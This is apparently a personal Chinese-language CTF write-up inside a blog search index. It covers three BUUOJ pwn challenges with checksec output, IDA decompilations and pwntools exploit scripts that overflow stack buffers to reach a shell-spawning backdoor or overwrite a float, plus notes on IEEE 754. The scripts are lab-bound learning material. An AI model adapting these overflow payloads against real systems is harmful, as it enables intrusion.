    <link href="/WP/"/>
    <url>/WP/</url>
    
    <content type="html"><![CDATA[<h1 id="不同类型的题目汇总"><a href="#不同类型的题目汇总" class="headerlink" title="不同类型的题目汇总"></a>不同类型的题目汇总</h1><p><strong><a href="https://buuoj.cn/challenges#rip">https://buuoj.cn/challenges#rip</a></strong> [ 最简单的rop ] </p><p>checksec:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/scr1w/pwn1$ checksec pwn1<br>[*] &#x27;/mnt/d/scr1w/pwn1/pwn1&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX unknown - GNU_STACK missing<br>    PIE:        No PIE (0x400000)<br>    Stack:      Executable<br>    RWX:        Has RWX segments<br>    Stripped:   No<br></code></pre></td></tr></table></figure><p>IDA_main:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">15</span>]; <span class="hljs-comment">// [rsp+1h] [rbp-Fh] BYREF</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;please input&quot;</span>);<br>  gets(s, argv);<br>  <span class="hljs-built_in">puts</span>(s);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;ok,bye!!!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>IDA_fun: [ backdoor_addr &#x3D; 0x401186 ] </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">fun</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>计算溢出长度 [ 缓冲区长度+old_ebp长度 [ 由程序位数决定 ] ]最后再加上目标返回地址，即后门函数的首地址加一位</p><p>exploit：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import * <br><br>#r = remote(&#x27;IP&#x27;,port)<br>r = process(&#x27;./rip&#x27;)<br><br>fun_addr = 0x401186<br><br>payload1 = b&#x27;a&#x27; * ( 0xF + 0x8 ) + p64( fun_addr + 1 )<br><br>r.recvuntil(&#x27;please input\n&#x27;)<br>r.sendline(payload1)<br>r.interactive()<br></code></pre></td></tr></table></figure><p><strong><a href="https://buuoj.cn/challenges#ciscn_2019_n_1">https://buuoj.cn/challenges#ciscn_2019_n_1</a></strong> [ 浮点数在计算机中的存储方式 IEEE 754标准 ]</p><p>checksec:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/scr1w/pwn3$ checksec ciscn_2019_n_1<br>[*] &#x27;/mnt/d/scr1w/pwn3/ciscn_2019_n_1&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    Stripped:   No<br></code></pre></td></tr></table></figure><p>IDA_main:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  setvbuf(_bss_start, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  func();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>IDA_func:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">func</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> v1[<span class="hljs-number">44</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-30h] BYREF</span><br>  <span class="hljs-type">float</span> v2; <span class="hljs-comment">// [rsp+2Ch] [rbp-4h]</span><br><br>  v2 = <span class="hljs-number">0.0</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Let&#x27;s guess the number.&quot;</span>);<br>  gets(v1);<br>  <span class="hljs-keyword">if</span> ( v2 == <span class="hljs-number">11.28125</span> )<br>    <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Its value should be 11.28125&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>通过get的溢出覆盖掉v2，使得v2满足条件后cat &#x2F;flag</p><p>exploit：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>#r = remote(&#x27;IP&#x27;,port)<br>r = process(&#x27;./ciscn_2019_n_1&#x27;)<br><br>payload1 = b&#x27;a&#x27; * 44  + p64(0x41348000)<br><br>r.sendline(payload1)<br>r.interactive()<br></code></pre></td></tr></table></figure><p><strong>IEEE 754规则</strong></p><p>float位数分配：</p><p>总共有32位，其中符号位1位，指数位8位，尾数位23位</p><p>double位数分配：</p><p>总共有64位，其中符号位1位，指数位11位，尾数位52位。</p><p>特殊值的表示：<br>零：当指数位和尾数位都为0时，表示数值0。正零的符号位为0，负零的符号位为1。<br>无穷大和无穷小：当指数位为全1，尾数位为0时，表示无穷大或无穷小。符号位为0表示正无穷大，符号位为1表示负无穷大。<br>NaN（Not a Number）：当指数位为全1，尾数位不为0时，表示NaN。NaN用于表示一些非法的数值操作结果，如0除以0等。 </p><p>以单精度浮点数计算3.14的表示举例说明：</p><p>3.14  其二进制表示为11.00100011110101110000101（取到足够精度）。</p><p>首先将其转换为科学计数法形式1.100100011110101110000101×2^1。</p><p>符号位为0（正数），</p><p>指数位为1+127（偏移量）&#x3D;128，</p><p>二进制表示为10000000。</p><p>尾数位去掉整数部分的1，保留小数部分，即100100011110101110000101。</p><p>最终存储为0 10000000 100100011110101110000101</p><p><strong>这其中小数部分转化为二进制步骤如下</strong></p><p>1.小数位0.14，0.14 * 2&#x3D;0.28，整数位为0，取0<br>2.小数位0.28，0.28 * 2&#x3D;0.56，整数位为0，取0<br>3.小数位0.56，0.56 * 2&#x3D;1.12，整数位为1，取1<br>4.小数位0.12，0.12 * 2&#x3D;0.24，整数位为0，取0</p><p>依次类推</p><p>指数位的计算：偏移量+二进制表示形式的指数<br>float型的偏移量为127，double的偏移量为1023</p><p>尾数位，去掉整数部分的1，就是尾数位</p><p><strong><a href="https://buuoj.cn/challenges#pwn1_sctf_2016">https://buuoj.cn/challenges#pwn1_sctf_2016</a></strong> [ C++语法 ]</p><p>checksec：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/scr1w/pwn4$ checksec pwn1_sctf_2016<br>[*] &#x27;/mnt/d/scr1w/pwn4/pwn1_sctf_2016&#x27;<br>    Arch:       i386-32-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x8048000)<br>    Stripped:   No<br></code></pre></td></tr></table></figure><p>IDA_main:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  vuln();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>IDA_vuln:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">vuln</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v0; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-3Ch] BYREF</span><br>  <span class="hljs-type">char</span> v3[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+3Ch] [ebp-1Ch] BYREF</span><br>  <span class="hljs-type">char</span> v4[<span class="hljs-number">7</span>]; <span class="hljs-comment">// [esp+40h] [ebp-18h] BYREF</span><br>  <span class="hljs-type">char</span> v5; <span class="hljs-comment">// [esp+47h] [ebp-11h] BYREF</span><br>  <span class="hljs-type">char</span> v6[<span class="hljs-number">7</span>]; <span class="hljs-comment">// [esp+48h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">char</span> v7[<span class="hljs-number">5</span>]; <span class="hljs-comment">// [esp+4Fh] [ebp-9h] BYREF</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Tell me something about yourself: &quot;</span>);<br>  <span class="hljs-built_in">fgets</span>(s, <span class="hljs-number">32</span>, edata);<br>  std::string::<span class="hljs-keyword">operator</span>=(&amp;input, s);<br>  std::allocator&lt;<span class="hljs-type">char</span>&gt;::<span class="hljs-built_in">allocator</span>(&amp;v5);<br>  std::string::<span class="hljs-built_in">string</span>(v4, <span class="hljs-string">&quot;you&quot;</span>, &amp;v5);<br>  std::allocator&lt;<span class="hljs-type">char</span>&gt;::<span class="hljs-built_in">allocator</span>(v7);<br>  std::string::<span class="hljs-built_in">string</span>(v6, <span class="hljs-string">&quot;I&quot;</span>, v7);<br>  <span class="hljs-built_in">replace</span>((std::string *)v3);<br>  std::string::<span class="hljs-keyword">operator</span>=(&amp;input, v3, v6, v4);<br>  std::string::~<span class="hljs-built_in">string</span>(v3);<br>  std::string::~<span class="hljs-built_in">string</span>(v6);<br>  std::allocator&lt;<span class="hljs-type">char</span>&gt;::~<span class="hljs-built_in">allocator</span>(v7);<br>  std::string::~<span class="hljs-built_in">string</span>(v4);<br>  std::allocator&lt;<span class="hljs-type">char</span>&gt;::~<span class="hljs-built_in">allocator</span>(&amp;v5);<br>  v0 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)std::string::<span class="hljs-built_in">c_str</span>((std::string *)&amp;input);<br>  <span class="hljs-built_in">strcpy</span>(s, v0);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;So, %s\n&quot;</span>, s);<br>&#125;<br></code></pre></td></tr></table></figure><p>IDA_get_flag：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">get_flag</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;cat flag.txt&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>计算的溢出长度为 60+4 但是输入限制是60 ，根据函数逻辑 I 替换为 you 所以可以通过这个特性达到溢出64的目的</p><p>exploit：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import * <br><br><br>#r = remote(&#x27;IP&#x27;，port)<br>r = process(&#x27;./pwn1_sctf_2016&#x27;)<br><br>ret_addr = 0x08048F0D<br>payload1 = b&#x27;I&#x27; * 20 + b&#x27;a&#x27; * 4 + P32(ret_addr + 1)<br><br>r.sendline(payload1)<br>r.interactive()<br></code></pre></td></tr></table></figure><p><strong><a href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%E5%86%B3%E8%B5%9B]PWN5">https://buuoj.cn/challenges#[第五空间2019决赛]PWN5</a></strong> [ 格式化字符串漏洞 ]</p>]]></content>
    
    
    <categories>
      
      <category>CTF_PWN</category>
      
      <category>Personal_wp</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
